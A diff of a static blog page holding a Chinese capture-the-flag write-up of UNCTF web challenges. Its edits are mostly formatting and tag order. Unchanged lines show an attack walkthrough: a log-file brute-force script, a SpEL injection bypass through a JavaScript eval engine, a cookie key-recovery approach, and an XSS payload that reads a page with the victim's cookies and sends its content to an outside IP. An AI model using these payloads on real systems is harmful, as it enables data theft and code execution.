@@ -62,7 +62,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/14/cTmhG39QuVYBJjs.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/14/tkMeWYQqiPGKyFa.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/14/Hdbw3OACRQMn6uZ.png">
-<meta property="og:updated_time" content="2019-11-14T13:37:37.401Z">
+<meta property="og:updated_time" content="2019-11-15T14:09:26.631Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="unctf竞技赛-web">
 <meta name="twitter:image" content="https://i.loli.net/2019/10/24/5lg8q6MOGfAC9VN.png">
@@ -421,8 +421,6 @@
 <p>  写个脚本</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://183.129.189.60:10041/runtime/log/2019&quot;</span><br><span class="line">for i in range(13):</span><br><span class="line">    for j in range(32):</span><br><span class="line">        i = str(i).zfill(2)</span><br><span class="line">        j = str(j).zfill(2)</span><br><span class="line">        url1 = url + i + &apos;/&apos; + j + &apos;.log&apos;</span><br><span class="line">        print url1</span><br><span class="line">        r = requests.get(url1)</span><br><span class="line">        if r.status_code == 200:</span><br><span class="line">            with open(&apos;a.txt&apos;, &apos;w+&apos;) as f:</span><br><span class="line">                f.write(url1 + &quot;\n&quot;)</span><br><span class="line">            print &quot;ok &quot;+url1</span><br></pre></td></tr></table></figure>
 
-
-
 <p>说明需要传入一个参数<code>safe_key</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;safe_key&apos; =&gt; &apos;easy_pentesnt_is_s0fun&apos;</span><br></pre></td></tr></table></figure>
 
@@ -565,7 +563,7 @@
 <p>然后就是第二步，考点是代码执行绕过</p>
 <p>这里有个<code>SPEL</code>注入，可以构造任意类，但是同样代码过滤了<code>Runtime|ProcessBuilder|Process</code></p>
 <p>这三个Java中执行命令的类，题目提示必须执行命令才能拿到flag</p>
-<p>然后这里有个trick，java内部有个<code>javascript的解析器</code>，可以解析javascript，而且在javascript内还能使用java对象</p>
+<p>然后这里有个trick，java内部有个<code>javascript的解析器</code>，可以解析javascript，而且在javascript内还能使用<code>java对象</code></p>
 <p>我们就可以通过<code>javascript</code>的<code>eval</code>函数操作<code>T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;xxxxxxxxx&quot;)</code></p>
 <p>由于不能使用关键字，我们可以通过字符串拼接来</p>
 <p><a href="http://juke.outofmemory.cn/entry/358362" target="_blank" rel="noopener">http://juke.outofmemory.cn/entry/358362</a> </p>
@@ -589,14 +587,15 @@
 <p>记住这里的<code>f_id</code>，即要下载的<code>f_id</code>，成功下载</p>
 <p>查看<code>flag.php</code></p>
 <p><img src="https://i.loli.net/2019/11/14/5YvimaCIJyQxe9u.png" alt="Snipaste_2019-11-14_11-35-34.png"></p>
-<p>首先需要绕过<code>check_login()</code>，跟踪<img src="https://i.loli.net/2019/11/14/erj2MzwIuLH8iSt.png" alt="Snipaste_2019-11-14_11-36-27.png"></p>
+<p>首先需要绕过<code>check_login()</code>，跟踪</p>
+<p><img src="https://i.loli.net/2019/11/14/erj2MzwIuLH8iSt.png" alt="Snipaste_2019-11-14_11-36-27.png"></p>
 <p>对cookie解密，跟踪<code>decrypt_str()</code></p>
 <p>  <img src="https://i.loli.net/2019/11/14/CknBzcRDuULNa2y.png" alt="Snipaste_2019-11-14_11-37-59.png"></p>
 <p>这好像是远古时期某个cms的加密，可以根据一组明文和密文还原出<code>key</code>，这里要根据具体文件猜测下明文，即<code>$info</code>，</p>
 <p>比如我的id是28，那么应该是<code>$info=[&#39;user_id&#39;=&gt;&#39;28&#39;];</code>，暂时未知其他<code>$info数组</code>的其他信息，<code>cookie[user]</code>如下</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25B5%2582%257B%258D%25DA%25BE%257F%2590%258Ej%25BE%25C6%25C4%25BD%25A4%25C2%25B8j%2584%25BC%2599%257D%257D%2594%25C7%2582%2581%258D%2581%25C0%25B8%25BE%25C6%25B6%25AA%25C0%25C4m%2580%25CC%258E%257C%2583u%25C1%25AD%25A7%25BBv%2583%25C6</span><br></pre></td></tr></table></figure>
 
-<p>  发现<code>urldecode()</code>两次之后仍然有51位，两种思路，一种是猜<code>$info</code>，最好能使其到51位，另一种是看看运气只跑24位，因为<code>$key</code>会循环，并且即使增加别的key-value大致不变</p>
+<p>  发现<code>urldecode()</code>两次之后仍然有51位，两种思路，一种是猜<code>$info</code>，最好能使其到51位，另一种是看看运气只跑24位，因为<code>$key</code>会循环，并且即使增加别的<code>key-value</code>大致不变</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize([&apos;id&apos;=&gt;&apos;28&apos;,&apos;name&apos;=&gt;&apos;bbbb&apos;])</span><br><span class="line">serialize([&apos;id&apos;=&gt;&apos;28&apos;)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/11/14/ZcquPY4BpD7CAVy.png" alt="Snipaste_2019-11-14_12-18-48.png"></p>
@@ -613,7 +612,7 @@
 <p><img src="https://i.loli.net/2019/11/14/cTmhG39QuVYBJjs.png" alt="Snipaste_2019-11-14_13-26-40.png"></p>
 <h3 id="superwaf"><a href="#superwaf" class="headerlink" title="superwaf"></a>superwaf</h3><p>验证码可以爆破</p>
 <blockquote>
-<p>绕过waf的思路是bypass xss/csp &lt;frameset onpageshow = ，扫描下目录容易发现Admin dir的路径为/admin/admin.php，使用exp脚本生成的payload如下图3所示，具体细节部分在exp文件夹下的exp.py文件中：</p>
+<p>绕过waf的思路是<code>bypass xss/csp</code> <code>&lt;frameset onpageshow =</code> ，扫描下目录容易发现Admin dir的路径为<code>/admin/admin.php</code>，使用exp脚本生成的payload如下图3所示，具体细节部分在exp文件夹下的exp.py文件中：</p>
 </blockquote>
 <p>😑😑😑😑没给exp，鸽了鸽了</p>
 <p>卧槽，还剩半小时上传了exp，赶紧补一下</p>
@@ -630,7 +629,7 @@
 <p>出现弹框，那么访问下提示路径，抓包</p>
 <p><img src="https://i.loli.net/2019/11/14/Hdbw3OACRQMn6uZ.png" alt="Snipaste_2019-11-14_15-19-41.png"></p>
 <blockquote>
-<p>再来看看页面的 ACL 头，可以带着 Cookie 发 XHR 请求。 </p>
+<p>再来看看页面的 <code>ACL</code> 头，可以带着 Cookie 发 <code>XHR</code> 请求。 </p>
 </blockquote>
 <p>上面这句话不是很李姐</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=new</span><br><span class="line">XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function()&#123;if(xmlhttp.readyState==4)&#123;location.href=&apos;http://59.110.164.44:1234/?flag=&apos;</span><br><span class="line">xmlhttp.responseText.match(&apos;flag\\&#123;(.\*?)\\&#125;&apos;)[1]&#125;&#125;;xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\&gt;</span><br></pre></td></tr></table></figure>
@@ -773,6 +772,15 @@
   
 <nav id="article-nav">
   
+    <a href="/2019/11/16/复现几个近期漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          复现几个漏洞
+        
+      </div>
+    </a>
+  
   
     <a href="/2019/11/11/buuctf-wp-6/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">buuctf-wp-6</div>
@@ -905,6 +913,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
@@ -921,19 +933,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">tp5</a>
+                <a href="javascript:void(0)" class="js-tag color4">duomicms</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">duomicms</a>
+                <a href="javascript:void(0)" class="js-tag color4">tp5</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -977,7 +985,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
+                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -985,7 +993,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
+                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1014,6 +1022,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">xxe</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">cve</a>
               </li>
              
               <li class="article-tag-list-item">
